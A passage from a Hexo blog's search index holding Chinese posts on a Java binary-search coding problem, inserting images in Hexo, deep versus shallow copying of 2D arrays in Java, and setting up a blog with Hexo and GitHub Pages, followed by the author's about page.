class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">import java.util.Arrays;<br>import java.util.Scanner;<br>public class Main &#123;<br>    public static void main(String[] args)&#123;<br>        Scanner scanner &#x3D; new Scanner(System.in);<br>        int N&#x3D;scanner.nextInt();<br>        int M&#x3D;scanner.nextInt();<br>        int[][] jobmap&#x3D; new int[N][2];<br>        for(int i&#x3D;0;i&lt;N;i++)&#123;<br>            jobmap[i][0]&#x3D;scanner.nextInt();<br>            jobmap[i][1]&#x3D;scanner.nextInt();<br>        &#125;<br>        &#x2F;&#x2F;将 薪资-能力 二维数组按能力要求增序排序<br>        Arrays.sort(jobmap,(int[] o1, int[] o2) -&gt;  o1[0]-o2[0]);<br>        &#x2F;&#x2F;排序后需要更新每个ability下的薪资为 可获得的最大值(如果低能力要职位的求薪资高于高能力要求职位的薪资，则更新高能力要求职位的薪资为高薪资)<br>        for (int i &#x3D; 0; i &lt; jobmap.length - 1; i++) &#123;<br>            if (jobmap[i][1] &gt; jobmap[i + 1][1]) &#123;<br>                jobmap[i + 1][1] &#x3D; jobmap[i][1];<br>            &#125;<br>        &#125;<br>        int[] people &#x3D; new int[M];<br>        for(int i&#x3D;0;i&lt;M;i++)&#123;<br>            people[i]&#x3D;scanner.nextInt();<br>        &#125;<br>        &#x2F;&#x2F; 二分查找确定能胜任的最大工作难度及其最大报酬<br>        for (int i &#x3D; 0; i &lt; people.length; i++) &#123;<br>            int index &#x3D; Arrays.binarySearch(jobmap, new int[] &#123;people[i], 0&#125;, (int[] jd1, int[] jd2) -&gt;jd1[0] - jd2[0]);<br>            index &#x3D; index &lt; 0 ? -(index + 1) - 1: index;<br>            System.out.println(index &gt;&#x3D; 0 ? jobmap[index][1] : 0);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>在初次编写代码的时候没有考虑到不一定报酬和工作难度都成正比。考虑不周全，需要注意。</li><li>在初次编写代码的时候，每个人都对所有工作进行遍历查找一次，时间复杂度为O(n²)。在数据量较大时性能不高，导致超时。改为二分查找后时间复杂度为O(log2(n))。</li><li>在使用Arrays.sort(T[] a, Comparator&lt;? super T&gt; c)方法时,使用了lambda表达式替代了匿名内部类。注意返回参数一减参数二的值是增序。</li><li>在使用Arrays.binarySearch(T[] a, T key, Comparator&lt;? super T&gt; c)时也使用了lambda表达式，在使用该方法前需要先使用sort方法排序。当查询的Key存在时，这个方法返回key在该数组中的下标，否则返回(-(insertion point) - 1)，insertion point指的是key在这个数组中应该插入的位置。也就是第一个比key大的值的下标，当key比所有值都大的时候，返回数组长度。所以当且仅当查找到key时，该方法的返回值才是正数。所以我们要寻找的最大报酬的工作的下标为 -(index + 1) - 1。</li></ul><blockquote><p>Java API中对Arrays.binarySearch(T[] a, T key, Comparator&lt;? super T&gt; c)返回值的描述</p></blockquote><p>index of the search key, if it is contained in the array; otherwise, (-(insertion point) - 1). The insertion point is defined as the point at which the key would be inserted into the array: the index of the first element greater than the key, or a.length if all elements in the array are less than the specified key. Note that this guarantees that the return value will be &gt;= 0 if and only if the key is found.</p>]]></content>
      
      
      <categories>
          
          <category> 编程题 </category>
          
          <category> 笔试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我翻译的文章在这里</title>
      <link href="/2018/09/08/%E6%88%91%E7%BF%BB%E8%AF%91%E7%9A%84%E6%96%87%E7%AB%A0%E5%9C%A8%E8%BF%99%E9%87%8C/"/>
      <url>/2018/09/08/%E6%88%91%E7%BF%BB%E8%AF%91%E7%9A%84%E6%96%87%E7%AB%A0%E5%9C%A8%E8%BF%99%E9%87%8C/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/user/1206354/articles" target="_blank" rel="noopener">这里是我腾讯云+社区的个人中心</a>，里面有我翻译的几篇文章。<br>虽然并不是专业的翻译，不过收到赞和关注的时候还是小有成就感&gt;&lt;。</p>]]></content>
      
      
      <categories>
          
          <category> 翻译 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Hexo文章中插入图片</title>
      <link href="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
      <url>/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<p>在写上一篇博客的时候，发现不知道该怎么往文章中插入图片，于是在网上搜。答案来来回回就那么两篇。于是就打开一个照着步骤做。</p><a id="more"></a><p>然后在操作的过程中，踩到了各种奇奇怪怪的坑。<br><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic01.jpg" alt><br>汪的一声就哭了<br>虽然在自己的不懈努力下<br>最后终于显示成功了。<br>可是，你不就一个低画质表情包吗！为什么显示这么大！！<br><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic02.jpg" alt><br>觉得可能是hexo主题的问题。既然这样，只能修改CSS。可是主题CSS一改，所有图片的样式都会受到影响。<br>在一番搜索过后，发现hexo可以直接使用img标签,在要添加图片的md文件所在的位置创建一个同名文件夹，把图片放在里面。然后把样式写在img标签里面。<br>すると：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;img src&#x3D;&quot;&#x2F;pic02.jpg&quot; alt&#x3D;&quot;&quot; style&#x3D;&quot;width:100px;height:100px&quot;&gt;<br></code></pre></td></tr></table></figure><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic02.jpg" alt style="width:100px;height:100px"><p>完美解决问题。当然，我的第一种插入图片方法只需要下面这几步。</p><ol><li><p>安装插件</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cnpm install hexo-asset-image --save<br></code></pre></td></tr></table></figure></li><li><p>在要添加图片的md文件所在的位置创建一个同名文件夹，把图片放在里面。</p></li><li><p>在md文件中使用 !(图片描述)[xxx.png]</p></li><li><p>hexo g -d 重新发布</p></li></ol><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic04.jpg" alt style="width:100px;height:100px;float:left;display:block"><p>如果出了意外，那就去Google吧。。</p><p> 顺便，在我不断地重新发布并查看页面的时候。明明源码已经修改过来，可是网页上显示的页面还是不变。一定是缓存的问题。于是我清空浏览器缓存，果真OK了。</p><p> 可是！每次调试都要清缓存真的好麻烦。。。<br><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic03.jpg" alt style="width:100px;height:100px" align="right"><br> 好在我发现了ctrl+F5 这个清缓存刷新的神奇快捷键。。。<br> 如果有遇到需要经常清缓存刷新的，这样方便多了。。<br>nice，插入图片已经不是问题了。<br>顺便,👇用这种方法可以把图片显示在文字右边，就像这样👉</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;img src&#x3D;&quot;&#x2F;pic03.jpg&quot; alt&#x3D;&quot;&quot; style&#x3D;&quot;width:100px;height:100px&quot; align&#x3D;&quot;right&quot;&gt;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java中二维数组的复制（深拷贝与浅拷贝）</title>
      <link href="/2018/08/30/Java%E4%B8%AD%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%A4%8D%E5%88%B6%EF%BC%88%E6%B7%B1%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/"/>
      <url>/2018/08/30/Java%E4%B8%AD%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%A4%8D%E5%88%B6%EF%BC%88%E6%B7%B1%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>最近在做一道编程题的时候出现了一处bug。在这道题需要使用多种方法对同一个二维数组进行更改，找出使第二列数之和最大的更改方法。所以每次修改之前，我对原数组进行拷贝，修改的是数组的拷贝。可是程序写完之后，运行结果却出乎意料的是错误的。看了几遍程序流程，觉得逻辑上没有错误。于是打开debug模式一步步看数值变化。调试时发现在第二次循环中，数组本该为0的位置，值却被改成了1,而这是第一次进行修改的结果。此时顿悟，想起很久之前学过的深拷贝和浅拷贝，绝对是clone()的问题。</p><a id="more"></a><p>我们重现一下当时的问题，上代码：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">public class cloneTeset &#123;<br>    public static void main(String[] args) &#123;<br>        int a[][] &#x3D; &#123;&#123;0,0,0&#125;,&#123;1,1,1&#125;,&#123;2,2,2&#125;&#125;;<br>        int b[][] &#x3D; a.clone();<br>        b[1][1]&#x3D;3;<br>        for(int i&#x3D;0;i&lt;3;i++)&#123;<br>            for(int j&#x3D;0;j&lt;3;j++)&#123;<br>                System.out.print(a[i][j]+&quot; &quot;);<br>            &#125;<br>            System.out.print(&quot; &quot;);<br>        &#125;<br>        System.out.println();<br>        for(int i&#x3D;0;i&lt;3;i++)&#123;<br>            for(int j&#x3D;0;j&lt;3;j++)&#123;<br>                System.out.print(b[i][j]+&quot; &quot;);<br>            &#125;<br>            System.out.print(&quot; &quot;);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果是</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">0 0 0  1 3 1  2 2 2  <br>0 0 0  1 3 1  2 2 2<br></code></pre></td></tr></table></figure><p>可以发现,对a的拷贝b进行修改后，原数组a的值也被修改了。这是为什么呢？</p><p>首先我们知道，虽然数组的声明方式与其他对象有所不同，但它也是new出来的。在Java中，数组是一个对象。</p><p>查看官方文档，在Object的Clone()方法的描述中有这么两段话:</p><blockquote><p>By convention, the object returned by this method should be independent of this object (which is being cloned). To achieve this independence, it may be necessary to modify one or more fields of the object returned by super.clone before returning it. Typically, this means copying any mutable objects that comprise the internal “deep structure” of the object being cloned and replacing the references to these objects with references to the copies. If a class contains only primitive fields or references to immutable objects, then it is usually the case that no fields in the object returned by super.clone need to be modified.<br>一般来说，我们希望cloen()方法返回的对象相是独立于被克隆对象的，所以我们在返回clone方法前，应该对克隆出的对象的域进行一些修改。这通常意味着，复制被克隆对象所包含的所有内部深层结构的可变对象，并且将域中的引用，指向这些复制出的对象。如果一个类只包含基础类型或者指向不可变对象的引用，那么将不用修改Super.clone()的返回结果。</p></blockquote><p>注：不可变对象有哪些？<br>String对象都是不可变对象。<br>原始类型包装类（primitive wrappers）（Integer，Long, Short, Double, Float, Character, Byte, Boolean）也都是不可变的。<br>关键字final用于声明基本类型和对象引用为不可变对象，但是它不能使对象本身变为不可变对象。</p><p>我们再看下一段：</p><blockquote><p>The method clone for class Object performs a specific cloning operation. First, if the class of this object does not implement the interface Cloneable, then a CloneNotSupportedException is thrown. Note that all arrays are considered to implement the interface Cloneable and that the return type of the clone method of an array type T[] is T[] where T is any reference or primitive type. Otherwise, this method creates a new instance of the class of this object and initializes all its fields with exactly the contents of the corresponding fields of this object, as if by assignment; the contents of the fields are not themselves cloned. Thus, this method performs a “shallow copy” of this object, not a “deep copy” operation. Thus, this method performs a “shallow copy” of this object, not a “deep copy” operation.<br>clone()方法首先会判断一个对象是否实现了Cloneable接口，如果没有实现，则会抛出CloneNotSupportedException。而所有的数组都默认实现了Cloneable接口。如果对数组T[]进行克隆，返回结果是T[]，T是引用或者基本类型。如果对对象进行克隆，首先会新建一个这个类的实例，然后根据这个对象中域的内容来对新建的实例进行初始化（赋值操作）。因此clone（）这个方法实现了浅拷贝，并不是深拷贝。</p></blockquote><p>从以上两段话我们可以看出：<br>clone( )方法创建调用它的对象的一个复制副本。只有那些实现Cloneable接口的类能被复制。<br>如果对数组T[]进行克隆，返回结果是T[]，T是引用或者基本类型。<br>我们克隆的数组是二维数组，即数组的数组。对于clone()方法来说，这里的T[]，T是一个对数组的引用。<br>也就是说：我们克隆出来的数组的第一维度，和原来那个数组的第一维度。同时指向了同一个第二位度的数组。<br>如下图：</p><p>因此当改变数组b的时候，数组a也被改变。此时的引用关系图如下：</p><p><img src="/2018/08/30/Java%E4%B8%AD%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%A4%8D%E5%88%B6%EF%BC%88%E6%B7%B1%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/clone1.png" alt></p><p>所以，为了实现二维数组的克隆，我们需要分别对第二维度的每一个数组进行克隆。<br>实现如下：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">int b[][] &#x3D; new int[a.length][];<br>for(int i&#x3D;0;i&lt;a.length;i++)&#123;<br>b[i]&#x3D;a[i].clone();<br>&#125;<br></code></pre></td></tr></table></figure><p>将之前代码的复制部分改为以上实现，输出结果如下：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">0 0 0  1 1 1  2 2 2  <br>0 0 0  1 3 1  2 2 2<br></code></pre></td></tr></table></figure><p>可以看出使用这种方法，实现了深拷贝，两个数组相互独立，不会互相影响。<br>同样的，Java提供的Arrays.copyof()方法对于二维数组也是浅拷贝，也需要我们为数组中的每一项进行copy。<br>此时的引用关系如下图：<br><img src="/2018/08/30/Java%E4%B8%AD%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%A4%8D%E5%88%B6%EF%BC%88%E6%B7%B1%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/clone2.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用Hexo和GitHubPages搭建博客</title>
      <link href="/2018/08/15/%E7%94%A8Hexo+GitHubPages%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2018/08/15/%E7%94%A8Hexo+GitHubPages%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>拥有自己的网站总是一件很酷的事，早就想自己写一个博客了。因为并没有深入学习前端，之前实验课模仿饿了么的商家入驻页面，一个页面写了几天才搞得差不多。虽然写前端也很吸引人，但果真我还是更喜欢写后台。最近在一个面试群里看到有人发自己的博客。用的是wordpress，听说这样很方便，于是就去搜了搜，于是就发现了HEXO。哇塞连后台都不用写了。虽然最近又有一大堆东西要复习。反正管它呢，搭了再说！</p><a id="more"></a><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>因为要用到GithubPages，所以首先在GitHub新建一个仓库，用来存放githubPages的项目文件。 GithubPages分为两种，个人页面和项目页面，个人页面每个用户只有一个,仓库名格式一定要为XXX.github.io。</p><p>下载安装node.js（安装hexo会用到）。node.js会自动将安装路径添加到环境变量。路径下有npm的命令行文件。<br>npm是包管理工具。可以从NPM服务器下载别人编写的第三方包，或者命令行。也可以上传自己编写的供别人使用。</p><p>将npm镜像更换为淘宝镜像，因为从国内访问原版镜像很慢。命令行执行：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org<br></code></pre></td></tr></table></figure><p>安装后就可以使用淘宝定制的 cnpm (gzip 压缩支持) 命令行工具代替默认的 npm</p><h3 id="安装并部署hexo"><a href="#安装并部署hexo" class="headerlink" title="安装并部署hexo"></a>安装并部署hexo</h3><p>创建一个文件夹，名为Myblog，在该文件夹路径下按shift+鼠标右键打开powershell，使用cnpm安装Hexo：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cnpm install -g hexo-cli<br></code></pre></td></tr></table></figure><p>安装完成后，初始化博客，其中blog是项目名称（可以修改为你想要的名称）：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo init blog<br></code></pre></td></tr></table></figure><p>新建一篇文章（markdown格式）</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">cd blog<br>hexo new &quot;My First Blog&quot;<br></code></pre></td></tr></table></figure><p>会在/blog/sources/_post/目录下生成My-First-Blog.md文件。</p><p>使用Hexo引擎将md文档格式渲染为html文件，并放入博客项目之中（blog/public/年/月/日/文章名 目录下）。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo generate<br></code></pre></td></tr></table></figure><p>修改项目部署配置文件</p><p>打开项目配置文件_config.yml，最后一行是部署配置，我们打开注释中的文档网址可以看到相关配置的含义。根据文档提示修改配置文件。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">deploy:<br>    type: git<br>    repo: https:&#x2F;&#x2F;github.com&#x2F;XXXXX&#x2F;XXXXX.github.io.git   #之前创建的那个仓库的完整路径<br></code></pre></td></tr></table></figure><p>保存关闭。</p><p>安装git部署插件</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cnpm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>部署</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo clean<br>hexo g      #hexo generate的缩写<br>hexo d      #hexo deploy的缩写<br></code></pre></td></tr></table></figure><p>部署成功后就可以访问啦！<br>路径是XXX.github.io</p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>首先在你的本地项目路径/source文件夹下创建一个文件名为CNAME，在其中写入你的域名。如</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">alphabet.com<br></code></pre></td></tr></table></figure><p>然后保存.<br>在项目路径打开Powershell</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo g -d      #重新生成文件并部署<br></code></pre></td></tr></table></figure><p>在github打开该仓库的设置页面,就是如下这个页面</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">https:&#x2F;&#x2F;github.com&#x2F;xxx&#x2F;xxx.github.io&#x2F;settings<br></code></pre></td></tr></table></figure><p>找到GitHub Pages，在其中的Custom Domain中填入自己的域名。</p><p>打开cmd，ping 你的项目路径，即XXX.github.io,你会得到一个ip地址，记住这个地址。<br>然后打开你的域名管理页面，在其中添加两个解析条目</p><table><thead><tr><th align="center">主机记录</th><th align="center">记录类型</th><th align="left">记录值</th></tr></thead><tbody><tr><td align="center">@</td><td align="center">A</td><td align="left">IP地址</td></tr><tr><td align="center">www</td><td align="center">CNAME</td><td align="left">xxx.github.io</td></tr></tbody></table><p>这样就OK了，访问域名就可以访问到自己的hexo博客了。<br>可以在github选择EnforceHTTPS,这样就算是http请求，也会被转为HTTPS。根据github的提示，只需要在域名解析中添加<br>以下四个条目中至少一个就可以了</p><table><thead><tr><th align="center">主机记录</th><th align="center">记录类型</th><th align="left">记录值</th></tr></thead><tbody><tr><td align="center">@</td><td align="center">A</td><td align="left">185.199.108.153</td></tr><tr><td align="center">@</td><td align="center">A</td><td align="left">185.199.109.153</td></tr><tr><td align="center">@</td><td align="center">A</td><td align="left">185.199.110.153</td></tr><tr><td align="center">@</td><td align="center">A</td><td align="left">185.199.111.153</td></tr></tbody></table><p>至此，如果不出意外的话，就可以从域名访问到GithubPage了！</p><h3 id="主题更换"><a href="#主题更换" class="headerlink" title="主题更换"></a>主题更换</h3><p>如果觉得默认主题不好看的话，可以<a href="https://hexo.io/themes/" target="_blank" rel="noopener">在这里</a>选择自己喜欢的主题。具体的配置根据每个主题下的ReadMe来修改就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 搭建 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="Pyrrhax"><a href="#Pyrrhax" class="headerlink" title="Pyrrhax"></a>Pyrrhax</h2><p><strong>Be What You Wanna Be!!!</strong></p><p><strong>GitHub:<a href="https://github.com/Pyrrhax" target="_blank" rel="noopener">@Pyrrhax</a></strong><br><strong>Email:<a href>pyrrhax.hf@gmail.com</a></strong><br><strong>我的书单：<a href="https://book.douban.com/people/184374019/">https://book.douban.com/people/184374019/</a></strong><br><strong>我的知乎：<a href="https://www.zhihu.com/people/pyrrhax" target="_blank" rel="noopener">https://www.zhihu.com/people/pyrrhax</a></strong><br><strong>我的CSDN:<a href="https://blog.csdn.net/weixin_42714910" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42714910</a></strong></p><h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>0.Pyrrha是动漫《RWBY》里面的Pyrrha.</p><p>1.<em>核心游戏玩家</em>。如果要说几个我喜欢的游戏的话，《半条命》系列，《古墓丽影9》，《深海迷航》，剧情类有《去月球》《奇异人生》系列，另外很期待万向跑步机普及后玩《半条命Alyx》的感觉。FPS游戏历程CF-&gt;逆站-&gt;AVA-&gt;WarFace-&gt;CS:GO-&gt;PUBG-&gt;叛乱-&gt;红色管弦乐-&gt;叛乱2。PUBG 1200+小时，最高日韩服Rank1.5%，不过很久没玩了。之前因为看了某动画，突然想玩MMORPG网游，了解了几天觉得想玩《勇者斗恶龙X》。不过竟然都X了，于是就了解了下《勇者斗恶龙》全系列。没错，于是我就买了NDSi来玩《勇者斗恶龙4》了。唔，果真日式RPG需要刷刷刷。不过在当时那个年代大家一定乐此不疲。在玩的还有《异域镇魂曲》，文本量巨大- -就当记单词了</p><p>2.<em>图吧垃圾佬</em>。沉迷捡垃圾和折腾软硬件。在知乎有个人说：“要把精力专注在业务上，而不是这种杂七杂八的问题。”可能说的就是我吧。。。笔记本改水冷，DIY充电宝，捡垃圾组装电脑和折腾和操作系统，用树莓派或安卓设备做移动渗透测试设备等等。你敢信家里十二年前的台式机现在还可以打英雄联盟。。。</p><p>3.<em>科幻爱好者</em>。《三体》《攻壳机动队》都十分喜欢，《攻壳机动队》简直是脑机接口发展的成熟阶段。要说崇拜的人大概是Musk吧。说到这些，想到一句话Any sufficiently advanced technology is indistinguishable from magic。</p><p>4.<em>比较宅</em>。每次出门后都要感叹，哇，现实世界的画质真的需要好复杂的计算，不过看起来竟没有更低一些的画质好看。</p><p>5.<em>语言学习</em>。希望成为一个fluent English Speaker.毕竟英语是我在CS之外，唯一坚持下来的算的上是爱好的东西。日语也学了一些，加油加油。</p><p>6.<em>读书</em>。会对自己感兴趣的方面阅读各种相关的书籍，也会读一些被人推荐的书。哲学读过一些入门书。心理学方面，认知神经学相关读的比较多。大概读几本科普或功能类书籍之后会读一本文学类作为切换。</p><p>7.<em>有一辆小摩托(GSX250R)</em>。穿上一身防水装备，机动性爆表，喜欢周末去城市周边跑山。文明驾驶，不是深夜炸街的鬼火少年哦。</p><p>8.怕什么真理无穷，进一寸有一寸的欢喜。</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
